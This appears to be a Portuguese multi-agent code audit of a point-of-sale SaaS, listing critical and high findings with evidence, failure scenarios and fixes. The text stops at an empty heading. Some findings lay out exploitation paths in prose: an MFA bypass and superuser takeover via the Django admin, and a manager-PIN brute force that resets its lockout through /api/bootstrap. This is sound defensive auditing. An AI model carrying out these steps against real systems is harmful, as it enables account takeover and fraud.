# Achados de código — auditoria de novembro/2026

Gerado pela auditoria multiagente. Cada achado crítico, alto e médio foi conferido por um ou dois verificadores
independentes instruídos a refutá-lo; os de severidade baixa não passaram por verificação.
Áreas auditadas por agentes diferentes podem apontar o mesmo defeito mais de uma vez.

## Crítico (6)

### Django admin em /control/ aceita login só com senha: ignora a MFA da plataforma e não tem limite de tentativas

- **Onde:** `cloud/pdvcloud/urls.py:27` · área `cloud-auth-tenancy` · categoria `security` · confirmado
- **Evidência:** `path("control/", admin.site.urls)` publica o admin padrão do Django. A MFA só é checada em `platform_user()` (cloud/core/api_common.py:178-181, flag de sessão `platform_mfa_verified`) e o `take_rate` só existe em `login_view` (views_auth.py:173). cloud/core/admin.py:17-52 registra como editáveis Plan, Tenant, Subscription, Terminal, Membership, Shop, Product, Customer, FinanceEntry, BillingInvoice etc.; `django.contrib.auth` ainda registra User e Group.
- **Cenário de falha:** Alguém com a senha do superusuário (phishing, reuso, ou força bruta em /control/login/, que não tem throttle) entra sem TOTP. Lá pode: marcar qualquer Subscription como ativa até 2099, criar Membership `owner` em qualquer empresa e ler/alterar vendas, clientes e financeiro de todos os tenants, trocar a senha de qualquer usuário ou criar outro superusuário e cadastrar a MFA dele no próprio celular. A MFA "obrigatória em produção" deixa de proteger a conta mais poderosa.
- **Correção:** Remover `control/` das rotas de produção (ou só montar quando DEBUG). Se o admin for necessário, usar um AdminSite cujo `has_permission` exija `request.session['platform_mfa_verified']` e cujo login redirecione para /login/ (fluxo com take_rate + MFA), além de restringir por IP no proxy.

### Venda offline legítima é rejeitada para sempre quando a configuração muda depois (limite de desconto, unidade do produto), e a revalidação roda até em reenvio de venda já aceita, travando toda a fila do terminal

- **Onde:** `cloud/core/sale_logic.py:137` · área `cloud-vendas-dinheiro` · categoria `data-loss` · confirmado
- **Evidência:** validate_sale compara a venda com o estado ATUAL da nuvem: `if discount_sale * 10000 > (gross_sale - promo_sale) * tenant.max_discount_bps: raise APIError(..., 403)` (l.99) e `if item["unit"] != product.unit: raise APIError("Unidade do produto não confere")` (l.66). Em persist_sale, `validated = validate_sale(data, tenant)` (l.137) roda ANTES de `previous = Sale.objects.filter(pk=sale_id).first()` (l.140). O mesmo padrão existe em views_terminal.py:444-447 (`if not product.stock_controlled: raise` antes de checar o ajuste já gravado). O sync é um lote atômico de 50 (views_terminal.py:477) e o terminal reenvia sempre os mesmos 50 mais antigos sem quarentena (terminal/sync.py:136-148). max_discount_bps é editável pela empresa (operations/views.py:68-72) e unit/stock_controlled por PATCH de produto (views_resources.py:84-85,126).
- **Cenário de falha:** Caixa vende com 15% de desconto (limite 20%). O dono baixa o limite para 10% no painel antes do terminal sincronizar (terminal offline, ou dentro da janela de 30 s do bootstrap). A nuvem responde 403 'Desconto acima do limite' para o lote inteiro; o terminal reenvia o mesmo lote a cada ciclo, indefinidamente. Nenhuma venda, sangria, fechamento de caixa, fiado ou devolução posterior daquele terminal chega mais à nuvem (estoque, financeiro e comissão param). O mesmo ocorre se o admin trocar a unidade de um produto UN->KG com venda pendente, ou se o ACK de uma venda já gravada se perder e a regra mudar antes do reenvio.
- **Correção:** 1) Em persist_sale, checar `previous` (por id + content_hash) antes de validate_sale e retornar direto. 2) Separar validação estrutural/aritmética (rejeita) de regra de negócio mutável (limite de desconto, unidade, stock_controlled): nessas, aceitar a venda e abrir SyncConflict (reason='discount_over_limit'/'unit_changed') para o admin. 3) No sync, tratar rejeição por evento (savepoint por evento, devolver `rejected:[{event_id, error}]`) e no terminal mover o evento rejeitado com 4xx para uma quarentena visível em vez de bloquear a fila.

### Um único evento recusado pela nuvem trava a fila (outbox) do terminal para sempre; não existe quarentena nem avanço

- **Onde:** `terminal/sync.py:142` · área `terminal-backend` · categoria `data-loss` · confirmado
- **Evidência:** sync_once() sempre reenvia os mesmos 50 primeiros pendentes (store.pending_events(50), store.py:343-346) e só dá ack se `response.get("accepted_event_ids") == expected` (sync.py:150). A nuvem processa o lote em uma transação e qualquer APIError rejeita tudo (cloud/core/views_terminal.py:473-514). Não há contador de tentativas, estado 'rejected' nem pulo do evento. E a nuvem revalida regras com o estado ATUAL: `discount_sale * 10000 > (gross_sale - promo_sale) * tenant.max_discount_bps` (sale_logic.py:99), `item["unit"] != product.unit` (sale_logic.py:66), `sale.status != "completed"` (sale_logic.py:195-198 e credit_logic.py:88-89), `sale.returns.exists()` (sale_logic.py:212).
- **Cenário de falha:** (a) Caixa offline vende com 15% de desconto (limite da licença era 20%); o dono baixa o limite para 10% em Empresa (operations/views.py:68) antes do sync -> 403 'Desconto acima do limite' em todo lote, para sempre. (b) Painel muda a unidade do produto de UN para KG com venda offline pendente -> 'Unidade do produto não confere'. (c) Gerente cancela/devolve a venda no painel e o caixa, que ainda vê a venda como concluída, também cancela ou devolve no terminal -> 409 eterno. Em todos os casos o terminal continua vendendo (a licença renova pelo bootstrap), mas NENHUMA venda, sangria, fiado ou fechamento posterior chega à nuvem; relatórios, estoque central e fiado ficam errados, a única cópia fica no SQLite do PC, e /api/new-profile e /api/unpair ficam bloqueados por 'eventos pendentes'. O único sinal é last_sync_error.
- **Correção:** Fazer a nuvem responder por evento (accepted / rejected + motivo) em vez de abortar o lote; no terminal, mover o evento recusado com 4xx definitivo para um estado 'rejected' (dead-letter) com registro em sync_conflicts e alerta visível, e seguir com os demais. Na nuvem, não revalidar política mutável (limite de desconto, unidade, status já revertido) para venda offline já concluída: aceitar e abrir SyncConflict, como já é feito para estoque negativo e devolução excedente.

### Backup horário nunca detecta falha: `if ! (backup_once)` desliga o `set -e` e o script grava `last-success` mesmo com pg_dump/restic falhando

- **Onde:** `infra/backup.sh:104` · área `operations-integracoes` · categoria `data-loss` · confirmado
- **Evidência:** Linha 104: `if ! (backup_once); then date -u +%s > /status/last-failure ...`. Em POSIX sh (bash, dash e busybox ash da imagem postgres:17-alpine), `set -e` é ignorado dentro de qualquer comando testado por `if`/`!`, inclusive subshell e função. Dentro de `backup_once` (linhas 30-47) nenhum comando tem checagem explícita: `pg_dump`, `pg_restore --list`, `restic backup` podem falhar e a execução segue até `date -u +%s > /status/last-success` (l.39) e `rm -f /status/last-failure /status/last-error` (l.41); o último comando é `trap -` (status 0). Reproduzi a semântica localmente em sh e dash: `set -eu; f(){ false; echo continuou; }; if ! (f); then echo falhou; else echo sucesso; fi` imprime `continuou` / `sucesso`. O modo `once` (l.98, usado por scripts/verify_backup.py) roda fora de `if`, por isso a validação manual passa e mascara o defeito.
- **Cenário de falha:** Credencial S3 expira, bucket enche, senha do Postgres é trocada ou o endpoint S3 cai: toda hora o pg_dump/restic falha, mas `/status/last-success` é atualizado e `last-failure` apagado. O painel Plataforma > Backups (operations/views_backup.py:79-86) mostra `healthy` com 'última cópia' recente por semanas. Quando o volume postgres_data se perde, não existe snapshot utilizável: perda total de vendas/estoque/financeiro de todos os clientes.
- **Correção:** Não chamar `backup_once` em contexto testado. Ex.: `set +e; (set -e; backup_once); rc=$?; set -e; if [ $rc -ne 0 ]; then ...` ou encadear cada passo com `|| return 1` dentro da função (pg_dump, pg_restore --list, restic backup, write_snapshots). Gravar `last-success` só após `restic backup` retornar 0 e, de preferência, após `restic check`/`restic snapshots --latest 1` confirmar o snapshot novo. Adicionar teste que simule pg_dump falhando no modo laço.

### Caixa instalado no Windows não conclui nenhuma venda: fuso fixo via ZoneInfo sem o pacote tzdata e exceção não capturada dentro da transação da venda

- **Onde:** `terminal/printers.py:92` · área `fiscal-ponta-a-ponta` · categoria `correctness` · confirmado
- **Evidência:** `_receipt_date` faz `datetime.fromtimestamp(value / 1000, ZoneInfo("America/Sao_Paulo"))` e só captura `(TypeError, ValueError, OverflowError, OSError)` (l.90-98). `ZoneInfoNotFoundError` herda de `KeyError` (MRO conferido localmente). `terminal/requirements.txt` tem apenas Flask, waitress, cryptography, requests e pywin32; `install-windows.ps1` l.48 instala só esse arquivo num venv novo, e não há `tzdata` em nenhum requirements do repositório. `Store.sale()` chama `self._receipt_data(conn, snapshot)` (store.py l.1261) dentro de `with self.transaction()`. Não executei em Windows; a conclusão vem do comportamento documentado do zoneinfo (Windows não tem base IANA do sistema).
- **Cenário de falha:** Loja instala o terminal com install-windows.ps1 em Windows limpo. Na primeira venda, `receipt_layout` chama `_receipt_date`, o ZoneInfo levanta ZoneInfoNotFoundError (KeyError), a exceção atravessa a transação, o SQLite faz rollback e a API devolve 500. Nenhuma venda é gravada; o mesmo ocorre em consulta de venda, estorno, reimpressão, devolução e recebimento de fiado (voucher_layout l.294 usa a mesma função).
- **Correção:** Adicionar `tzdata` a terminal/requirements.txt, capturar `KeyError`/`ZoneInfoNotFoundError` em `_receipt_date` com fallback para horário local, e tirar a renderização do comprovante de dentro da transação da venda (falha de layout não pode desfazer venda). Incluir teste que simula ZoneInfo indisponível.

### /control/ (Django admin) aceita só senha, sem MFA e sem limite de tentativas, e dá escrita total em todas as empresas

- **Onde:** `cloud/pdvcloud/urls.py:27` · área `admin-django-migracoes-dados` · categoria `security` · confirmado
- **Evidência:** `path("control/", admin.site.urls)` usa o login padrão do Django admin. A exigência de MFA só existe em `platform_user()` (cloud/core/api_common.py:180, `request.session.get("platform_mfa_verified")`) e o limite de tentativas só em `login_view` (cloud/core/views_auth.py:173, `take_rate(f"login:{client}:{email}", 5, 900)`). O admin também expõe `auth.User`/`Group` (registrados pelo django.contrib.auth) e os modelos de cloud/core/admin.py:17-52. Usuário staff sem superusuário entra mas não vê nada (os grupos de 0004_platform_groups.py não têm permissões de modelo); o risco real é a conta superusuário.
- **Cenário de falha:** Senha de um superusuário vaza (phishing/reuso) ou é quebrada por força bruta em /control/login/ (sem throttle). O invasor entra sem TOTP e: (a) cria em /control/auth/user/add/ um novo superusuário e, no primeiro login pela API, recebe `mfa_setup_required` (views_auth.py:186) e cadastra o PRÓPRIO TOTP, ganhando o painel SaaS com MFA 'válida'; (b) cria um Membership role=owner para si em qualquer empresa e usa /api/v1/* com X-Tenant-ID (membership_context, api_common.py:126, não exige MFA), lendo/alterando vendas, clientes e financeiro de qualquer cliente; (c) troca a senha de qualquer dono de empresa. Contradiz docs/API-V2.md:38 ('admin de plataforma não ganha acesso automático aos dados de uma empresa').
- **Correção:** Remover `control/` das rotas de produção, ou trocar por um AdminSite próprio cujo `has_permission` exija `request.session['platform_mfa_verified']` e cujo login redirecione para /login/ (fluxo com TOTP e take_rate). Desregistrar `User`/`Group` do admin (ou deixá-los somente leitura) e restringir /control/ por IP/VPN no proxy.

## Alto (54)

### Alteração manual de assinatura no admin SaaS não toca no vínculo do Asaas: troca de plano é revertida e cancelamento é desfeito no próximo pagamento

- **Onde:** `cloud/core/views_platform.py:325` · área `cloud-auth-tenancy` · categoria `money` · confirmado
- **Evidência:** `subscription_detail` PATCH (linhas 325-343) só grava plan/status/período e põe `license_source = "manual"`; não consulta nem desativa `BillingBinding` e não chama o provedor (só `subscription_vip`, linhas 371-398, faz isso). Em operations/services.py:93-100, `paid_takeover = sub.license_source != 'subscription'` e, com pagamento confirmado, `sub.plan=binding.plan; sub.status='active'`. Não existe código que atualize ou cancele a assinatura remota (integrations/billing.py só tem create/get/list). operations/views.py:161-162 manda o cliente "solicitar alteração à plataforma".
- **Cenário de falha:** (a) Cliente pede upgrade; o financeiro troca o plano pelo painel. No próximo boleto/PIX pago (valor antigo), a conciliação volta o plano para `binding.plan`: o cliente perde o upgrade. Se ele já usa mais terminais que o plano antigo, `capacity_fits` falha, o job vai para needs_review, o período não é renovado e 72h depois o cliente que pagou fica bloqueado. (b) Financeiro marca `cancelled`/`suspended`: o Asaas continua emitindo cobranças e, se uma for paga, a assinatura volta para `active` sozinha.
- **Correção:** No PATCH, quando houver `BillingBinding` ativo: para troca de plano, atualizar valor/plano no Asaas e no binding (ou exigir nova contratação); para cancelar/suspender, cancelar a assinatura remota e desativar o binding na mesma operação. Recusar com 409 quando houver ProviderJob de cobrança pendente, como o VIP já faz.

### App iOS não consegue fazer login em produção: POST sem Origin/Referer é rejeitado pelo CSRF do Django em HTTPS

- **Onde:** `cloud/pdvcloud/settings.py:67` · área `cloud-auth-tenancy` · categoria `correctness` · confirmado
- **Evidência:** `CsrfViewMiddleware` ativo (linha 67), `SECURE_SSL_REDIRECT = not DEBUG` (107) e `SECURE_PROXY_SSL_HEADER` (119-120) tornam todo POST de produção `is_secure()`. Django 5.2.17 (django/middleware/csrf.py:441 e 297-300) rejeita POST seguro sem `Origin` quando `HTTP_REFERER` é None ("no Referer"). ios/PDV2OwnerMonitor/PDV2OwnerMonitor/APIClient.swift:45-52 e 78-88 envia só `Accept`, `Content-Type` e `X-CSRFToken`; URLSession não adiciona Origin nem Referer. `login_view` não é csrf_exempt.
- **Cenário de falha:** Proprietário abre o PDV2 Monitor apontando para https://dominio, digita e-mail e senha corretos e recebe 403 "CSRF inválido; atualize a página e tente novamente". Em desenvolvimento (HTTP) funciona, por isso passa nos testes locais. Não executei o app; a conclusão vem da leitura do middleware e do cliente.
- **Correção:** No APIClient, enviar `Origin: https://<host>` (ou `Referer: <baseURL>/`) em todo POST. Melhor a médio prazo: endpoint de login móvel com token próprio (Bearer), sem cookie de sessão nem CSRF.

### Não existe troca nem recuperação de senha para usuários das empresas

- **Onde:** `cloud/core/views_users.py:93` · área `cloud-auth-tenancy` · categoria `security` · confirmado
- **Evidência:** `user_detail` só aceita `("name", "role", "active", "commission_bps")` (linha 93). Em cloud/, operations/, integrations/ e shared/ o único `set_password` fora do seed é o PATCH do superusuário SaaS (views_platform.py:140-141). Nenhum `send_mail`/`EmailMessage` existe no código; as variáveis EMAIL_* de settings.py:123-129 não são usadas. web/assets/app.js não tem tela de troca de senha. A senha do funcionário é definida pelo admin na criação (views_users.py:53-59).
- **Cenário de falha:** Dono esquece a senha: a única saída é o superusuário da CrownTech redefinir manualmente. Funcionário cuja senha vazou não consegue trocá-la; o dono só pode desativar o cadastro. O admin que criou o usuário conhece a senha dele para sempre e pode entrar no painel como ele.
- **Correção:** Criar POST /auth/password (senha atual + nova, com `update_session_auth_hash`), fluxo "esqueci minha senha" por e-mail com token de uso único e expiração, e ação de owner/admin que gera senha provisória com troca obrigatória no primeiro acesso.

### Fechamento de caixa com valor esperado negativo é recusado pela nuvem e bloqueia a fila do terminal

- **Onde:** `cloud/core/views_terminal.py:426` · área `cloud-vendas-dinheiro` · categoria `data-loss` · confirmado
- **Evidência:** `expected = money(data["expected_cents"], "Valor esperado")` exige >= 0 e CashSession.expected_cents é PositiveBigIntegerField (models.py:460). No terminal o esperado é `opening + cash_sales_net + supplied - withdrawn - cash_refunds + credit_received_cash` considerando só vendas `status='completed'` (terminal/store.py:955,994-996); a sangria é limitada ao esperado do momento (store.py:1037), mas void_sale (store.py:1278-1314) não confere o dinheiro da gaveta.
- **Cenário de falha:** Abertura R$ 0, venda de R$ 100 em dinheiro, sangria de R$ 100 (esperado = 0). O operador cancela a venda (lançada em dinheiro por engano, refeita no cartão). A venda sai do somatório e o esperado vira -R$ 100. Ao fechar o caixa o terminal enfileira cash.closed com expected_cents=-10000; a nuvem responde 400 'Valor esperado inválido' para o lote inteiro e para sempre: todas as vendas seguintes do terminal ficam presas.
- **Correção:** Aceitar expected_cents inteiro com sinal em cash.closed (validar só `difference == counted - expected`), trocar CashSession.expected_cents para BigIntegerField (migração) e, no terminal, exigir PIN de gerente/alerta quando o cancelamento deixar o esperado negativo.

### Estorno feito no caixa (sale.voided) é recusado com 409 quando a venda mudou no painel ou tem nota autorizada, travando o sync

- **Onde:** `cloud/core/sale_logic.py:195` · área `cloud-vendas-dinheiro` · categoria `data-loss` · confirmado
- **Evidência:** reverse_sale: `if sale.status != "completed": if sale.status == status and sale.cancellation_reason == reason: return sale; raise APIError("Venda já revertida com outro motivo ou operação", 409)` (l.195-198); `if FiscalDocument...status__in=("authorized","cancel_pending").exists(): raise APIError(..., 409)` (l.199-200); `if sale.returns.exists(): raise APIError(..., 409)` (l.212-213). Chamado direto dentro da transação do lote em views_terminal.py:495-502. O terminal não conhece estado fiscal nem ações do painel e permite cancelar enquanto o caixa da venda está aberto (terminal/store.py:1278-1292).
- **Cenário de falha:** (a) Venda sincroniza, o gerente emite a NFC-e pelo painel (operations/views.py:213-217, fica 'authorized'); minutos depois o cliente desiste e o caixa cancela a venda no terminal: o evento sale.voided recebe 409 em todo reenvio. (b) O gerente registra devolução parcial pelo painel e o caixa, sem saber, cancela a venda no terminal. (c) O admin cancela a venda no painel com motivo 'erro' e o caixa cancela a mesma venda no terminal com motivo 'cliente desistiu'. Nos três casos o terminal já devolveu estoque/dinheiro localmente, a nuvem recusa o lote inteiro indefinidamente e as vendas posteriores não sobem.
- **Correção:** Para origem terminal, nunca rejeitar um estorno já ocorrido: se a venda já estiver revertida, aceitar como no-op; se houver nota autorizada ou devolução, aplicar o que for possível (ou marcar a venda como 'void_pending') e criar SyncConflict (reason='void_blocked_fiscal'/'void_after_return') para o admin resolver. Manter o 409 apenas para ações do painel.

### Devolução feita no caixa é rejeitada (409) se a venda foi cancelada/estornada no painel antes do sync, apesar de o dinheiro já ter saído da gaveta

- **Onde:** `cloud/core/credit_logic.py:88` · área `cloud-vendas-dinheiro` · categoria `data-loss` · confirmado
- **Evidência:** validate_return: `if sale.status != "completed": raise APIError("Venda cancelada não aceita devolução", 409)` vale também para origin='terminal', contrariando a própria docstring ('Terminal returns already happened at the counter... an over-return is accepted'). apply_return é chamado dentro do lote atômico (views_terminal.py:507-510).
- **Cenário de falha:** Terminal offline devolve 1 item em dinheiro (R$ 50 saem da gaveta, vale impresso). Antes de sincronizar, o financeiro marca a mesma venda como 'refunded' no painel (/sales/<id>/refund). Quando o terminal volta, o evento sale.returned recebe 409 para sempre; o lote inteiro falha e nenhum evento posterior do terminal entra. Além disso o cliente foi reembolsado duas vezes sem nenhum registro central.
- **Correção:** Para origin='terminal', aceitar a devolução mesmo com venda não 'completed': gravar SaleReturn (sem repor estoque já reposto pelo cancelamento) e abrir SyncConflict reason='return_on_reversed_sale' com valores para conferência. Rejeitar apenas no painel.

### DELETE em /finance/<id> cancela fiado gerado por venda, burlando a trava que só existe no PATCH

- **Onde:** `cloud/core/views_finance.py:68` · área `cloud-vendas-dinheiro` · categoria `money` · confirmado
- **Evidência:** `if request.method == "DELETE": data = {"status": "cancelled"}` e a proteção `if row.sale_id and set(data) & {"amount_cents","customer_id","shop_id"}: raise APIError("Fiado gerado por venda: ... use devolução ou cancelamento da venda", 409)` (l.75-76) fica só no ramo `else` (PATCH). O DELETE segue e grava status='cancelled' (l.93-97).
- **Cenário de falha:** Usuário com papel finance envia DELETE /api/v1/finance/<id da parcela de fiado de R$ 800>. A parcela vira 'cancelled': o saldo de fiado do cliente zera (credit_logic.balances só soma status='open'), o limite de crédito é liberado no caixa, a venda continua 'completed', o estoque não volta e a comissão do vendedor permanece. A dívida some sem devolução nem cancelamento da venda; o único rastro é um 'finance.updated' genérico na auditoria.
- **Correção:** No ramo DELETE, recusar quando `row.sale_id` estiver preenchido (409 com a mesma mensagem) ou exigir fluxo próprio de 'perdão de dívida' restrito a owner, com motivo obrigatório e auditoria específica.

### Operador de caixa consegue alterar o limite de fiado (credit_limit_cents) de qualquer cliente pela API/painel

- **Onde:** `cloud/core/views_resources.py:22` · área `cloud-estoque-catalogo` · categoria `security` · confirmado
- **Evidência:** RESOURCE["customers"] usa `CONTACT_WRITE | {"cashier"}` como papéis de escrita (linha 22) e form_values libera `credit_limit_cents` para qualquer papel que escreve em customers (`allowed = allowed | {"credit_limit_cents"}`, linha 90). O painel confirma: web/assets/app.js:514 `edit: () => can("owner","admin","manager","cashier")` e o campo "Limite de fiado" na linha 520, cujo texto diz que acima do limite o caixa exige PIN de gerente. DELETE (desativar cliente) também fica liberado ao caixa.
- **Cenário de falha:** Caixa faz login no painel (tem e-mail/senha, views_users.py:74), abre Clientes, edita um cliente cúmplice (ou cria um) e põe limite de fiado R$ 50.000. O bootstrap do terminal (views_terminal.py:300) baixa o novo limite e a venda a prazo passa sem PIN de gerente. O controle de 'PIN de gerente acima do limite' é contornado pelo próprio caixa; a dívida fica em contas a receber sem aprovação.
- **Correção:** Separar o campo: em form_values, aceitar `credit_limit_cents` (e `active`/DELETE) somente quando member.role estiver em CONTACT_WRITE (owner/admin/manager); o caixa continua podendo criar cliente com nome/documento/telefone e limite 0. Passar `member.role` para form_values e rejeitar com 403. Ocultar o campo no painel para cashier.

### Trocar a unidade (UN/KG/L) ou desligar 'controla estoque' de um produto com eventos offline pendentes trava a fila inteira do terminal

- **Onde:** `cloud/core/views_resources.py:126` · área `cloud-estoque-catalogo` · categoria `data-loss` · confirmado
- **Evidência:** form_values aceita `unit` e `stock_controlled` em PATCH sem verificar histórico (linhas 102-105 e 126-129). Na sincronização, sale_logic.py:66 faz `if item["unit"] != product.unit: raise APIError("Unidade do produto não confere")`, views_terminal.py:406-407 valida o ajuste com a unidade atual e views_terminal.py:444-445 rejeita ajuste de produto sem controle de estoque. O APIError derruba o lote inteiro (transaction.atomic em views_terminal.py:477) e terminal/sync.py:134-150 reenvia sempre os mesmos 50 eventos pendentes.
- **Cenário de falha:** Produto cadastrado errado como UN é corrigido para KG no painel às 10h00. Um caixa (offline, ou online antes do refresh de catálogo de 30 s) vendeu 1 UN desse produto às 09h59. Ao sincronizar, o servidor responde 400 'Unidade do produto não confere' para o lote; o terminal nunca confirma o lote e todas as vendas, sangrias e fechamentos seguintes desse caixa ficam presos no SQLite local, fora do painel, estoque, financeiro e fiado, até intervenção manual no banco.
- **Correção:** A venda já aconteceu: em validate_sale, validar a quantidade contra a unidade do snapshot do item (item["unit"]) e gravar SaleItem.unit com ela, em vez de rejeitar. Em _persist_adjustment, aceitar e ignorar (ack) ajuste de produto que deixou de controlar estoque. Complementar: bloquear troca de `unit` quando existir StockMovement/SaleItem do produto (exigir novo cadastro) e nunca deixar um evento inválido bloquear o lote (quarentena por evento com SyncConflict).

### Relatórios de lucro (Curva ABC e Lucro bruto por dia) usam o custo ATUAL do produto para vendas passadas

- **Onde:** `cloud/core/views_reports.py:137` · área `cloud-estoque-catalogo` · categoria `money` · confirmado
- **Evidência:** products_abc: `cost = int(Decimal(r["product__cost_cents"]) * Decimal(r["qty"]) / 1000)` (linha 137) e profit_by_day: `Decimal(r["product__cost_cents"]) * Decimal(r["quantity_milli"])` (linha 158). SaleItem (models.py:284-298) não guarda custo no momento da venda; Product.cost_cents é a média móvel alterada a cada entrada (views_stock.py:191). Além disso o custo só nasce por entrada: cadastro rejeita cost_cents (tests.py:155-157), então produto com estoque inicial lançado por ajuste/inventário fica com custo 0.
- **Cenário de falha:** Em janeiro o arroz custava R$ 20 e foi vendido a R$ 25 (margem 20%). Em março chega NF-e a R$ 26; a média vai para ~R$ 24. O relatório 'Lucro bruto por dia' de janeiro, reemitido em março, passa a mostrar margem de 4% — o lucro de períodos já fechados muda a cada compra. Para produtos sem entrada registrada o relatório mostra margem de 100%.
- **Correção:** Adicionar `unit_cost_cents` em SaleItem (migração com default 0 + backfill com o average_cost_cents do último StockReceiptItem anterior à venda), preencher em persist_sale com product.cost_cents e usar esse campo nos relatórios (Sum de expressão no banco). Permitir informar custo inicial no cadastro/ajuste de saldo inicial.

### Curva ABC, lucro, formas de pagamento, operador/vendedor e hora ignoram devoluções; números não fecham com 'Vendas por dia'

- **Onde:** `cloud/core/views_reports.py:127` · área `cloud-estoque-catalogo` · categoria `correctness` · confirmado
- **Evidência:** Só sales_by_day (linhas 64-72) e cash_flow (217-219) descontam SaleReturn. products_abc (127-129), profit_by_day (152-158), sales_by_payment (94-97), _by_person (114-116), sales_by_hour e promotions_report somam SaleItem/SalePayment/total_cents cheios. A devolução não muda o status da venda (credit_logic.py:139-181 não altera sale.status), então a venda devolvida continua 'completed' com 100% do valor.
- **Cenário de falha:** Loja de moda vende R$ 10.000 no dia e recebe R$ 2.000 em trocas/devoluções. 'Vendas por dia' mostra líquido R$ 8.000; 'Lucro bruto por dia' e 'Curva ABC' mostram faturamento R$ 10.000 e lucro sobre peças que voltaram para o estoque; 'Vendas por vendedor' credita os R$ 10.000. O dono decide compra e comissão com lucro inflado.
- **Correção:** Agregar SaleReturnItem (quantity_milli, amount_cents) por produto/dia e subtrair de qty/revenue/cost em products_abc e profit_by_day; subtrair SaleReturn.total_cents por vendedor/operador e por refund_method em sales_by_payment; exibir coluna 'Devoluções' e 'Líquido' como já feito em sales_by_day.

### Cadastro de produto não aceita o código de barras de fábrica (EAN) nem custo: todo produto criado no painel recebe EAN interno prefixo 2

- **Onde:** `cloud/core/views_resources.py:84` · área `cloud-estoque-catalogo` · categoria `ux-bug` · confirmado
- **Evidência:** Para products, `allowed` não contém `barcode`, `sku` nem `cost_cents` (linhas 84-86) e `fields()` rejeita chaves extras; na criação `values.update(generated_product_codes(tenant))` (linha 198) sempre gera SKU aleatório e EAN-13 '2...'. O painel confirma (web/assets/app.js:490: 'Código interno EAN-13 gerado para esta empresa; bloqueado para edição'). O único caminho que grava EAN real é o produto novo via NF-e (views_purchases.py:96-98). Os ramos `sku`/`barcode` de form_values (linhas 149-155) são código morto.
- **Cenário de falha:** Mercado cadastra 3.000 itens pelo painel. No caixa, o leitor lê o EAN da embalagem (789...) e o produto não é encontrado, porque o cadastro só tem o código interno 2xxxxxxxxxxx; a loja é obrigada a reetiquetar tudo ou digitar. Não há como corrigir depois: PATCH também rejeita `barcode`.
- **Correção:** Aceitar `barcode` opcional em POST/PATCH de products (validar GTIN-8/12/13/14 com nfe.valid_gtin, unicidade já coberta por product_tenant_barcode_unique) e só gerar código interno quando vier vazio; idealmente modelo ProductBarcode (N códigos por produto, com fator para caixa/fardo). Aceitar custo inicial opcional na criação.

### O bloqueio por tentativas do PIN de gerente é apagado a cada bootstrap (30 s, ou sob demanda sem login), permitindo força bruta

- **Onde:** `terminal/store.py:661` · área `terminal-backend` · categoria `security` · confirmado
- **Evidência:** manager_override() guarda o contador na linha fixa `operator_id='manager_override'` de login_attempts (store.py:879-889). apply_bootstrap() executa `DELETE FROM login_attempts WHERE operator_id NOT IN (<ids dos operadores>)` (store.py:660-664), que remove essa linha porque 'manager_override' não é um operador. O worker faz bootstrap a cada 30 s (sync.py:243) e POST /api/bootstrap não exige login (app.py:227-232). Confirmado em banco temporário: 5 erros -> 429; após apply_bootstrap a tentativa seguinte volta a 403 (contador zerado).
- **Cenário de falha:** Um caixa logado roda no console do navegador um laço: 4 chamadas a /api/discount/authorize (ou /api/sales/<id>/void) com PINs sequenciais, depois POST /api/bootstrap, e repete. Sem o bloqueio de 5 minutos, varre o espaço de 6 dígitos em poucos dias (mais rápido com vários gerentes, pois qualquer PIN de owner/admin/manager serve). Com o PIN do gerente ele cancela vendas em dinheiro e fica com o valor, faz devolução em dinheiro, autoriza desconto até o teto e fecha o caixa.
- **Correção:** Excluir a chave 'manager_override' das limpezas do bootstrap (ou guardar o contador em tabela/meta própria) e só zerar o contador de um operador quando o pin_hash dele mudar. Exigir sessão autenticada ou limitar a frequência de /api/bootstrap, e aplicar atraso progressivo por sessão/operador solicitante.

### Renovação da licença depende de o catálogo inteiro validar; produto com nome de 161 a 180 caracteres (aceito pela nuvem) impede a renovação e para todos os caixas em 72 h

- **Onde:** `terminal/store.py:632` · área `terminal-backend` · categoria `correctness` · confirmado
- **Evidência:** `_str(product.get("name"), "Nome do produto")` usa o máximo padrão de 160 (store.py:74), mas a nuvem aceita 180: `text(value, "Nome", ... else 180)` (cloud/core/views_resources.py:152), `f"{group.name} - {label}"[:180]` (product_groups.py:66) e importação de compra (views_purchases.py:94). A licença nova só é gravada no fim da mesma transação: `self._set_meta(conn, "lease", _json(lease))` (store.py:683). Confirmado: bootstrap com um produto de 170 caracteres falha com 'Nome do produto inválido' e a licença não é renovada.
- **Cenário de falha:** Loja de moda cria uma grade cujo nome + variação passa de 160 caracteres (ou cadastra/importa um produto com descrição longa). A partir daí todo bootstrap de todos os terminais da empresa falha: preços, estoque, operadores, clientes e promoções param de atualizar na hora e, 72 h depois (24 h se past_due), todos os caixas mostram 'Prazo offline expirado' mesmo online e com a assinatura paga. A causa só aparece como texto em last_sync_error.
- **Correção:** Alinhar o limite (180) e, principalmente, desacoplar: gravar a licença/operadores verificados antes de processar o catálogo e tratar linha inválida de produto/cliente como item ignorado com aviso, não como falha total do bootstrap.

### Cancelar venda em dinheiro depois de uma sangria deixa o caixa esperado negativo; o evento cash.closed é recusado pela nuvem e bloqueia a fila

- **Onde:** `terminal/store.py:1056` · área `terminal-backend` · categoria `money` · confirmado
- **Evidência:** void_sale() não confere o dinheiro do caixa (store.py:1278-1314), diferente de devolução (linha 1393) e sangria (linha 1037). close_cash() envia `"expected_cents": expected` como vier (store.py:1056-1064). A nuvem valida `expected = money(data["expected_cents"], "Valor esperado")` (cloud/core/views_terminal.py:426), que recusa valor < 0 (api_common.py:82-85). Confirmado em banco temporário: abertura 0, venda R$ 100 em dinheiro, sangria R$ 100, cancelamento da venda, fechamento -> evento com expected_cents = -10000.
- **Cenário de falha:** Turno: abertura R$ 50, R$ 300 em vendas em dinheiro, sangria de R$ 300 ao meio-dia; à tarde o gerente cancela uma venda de R$ 80 da manhã (dinheiro devolvido com valor trazido do cofre sem registrar suprimento). Esperado = 50 + 220 - 300 = -30. Ao fechar o caixa, a nuvem responde 400 'Valor esperado inválido' para o lote inteiro em toda tentativa, e pelo defeito da fila nada mais desse terminal sincroniza.
- **Correção:** No terminal, bloquear (ou exigir suprimento antes de) o cancelamento de venda em dinheiro quando o valor em espécie excede o esperado, como já é feito na devolução. Na nuvem, aceitar expected_cents negativo em cash.closed (é um fato já ocorrido) e sinalizar a diferença.

### Estorno/chargeback não revoga o acesso: assinatura vira `past_due` mas continua válida até o fim do período pago (até 1 ano no plano anual)

